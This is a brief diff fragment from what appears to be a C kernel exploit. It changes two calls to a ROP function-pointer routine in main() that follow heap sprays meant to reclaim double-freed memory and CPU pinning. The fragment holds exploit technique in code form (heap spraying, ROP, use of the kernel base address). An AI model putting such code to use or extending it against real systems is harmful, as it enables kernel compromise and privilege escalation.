@@ -305,8 +305,8 @@ int main()
         spray_map[i] = spray_start[i];
     //run malloc sprays to reclaim any potential double frees
     pin_to_cpu(6);
-    rop_call_funcptr(spray_map, kernel_base);
+    rop_call_funcptr(spray_map, spray_sock, kernel_base);
     pin_to_cpu(7);
-    rop_call_funcptr(spray_map, kernel_base);
+    rop_call_funcptr(spray_map, NULL, kernel_base);
     return 0;
 }
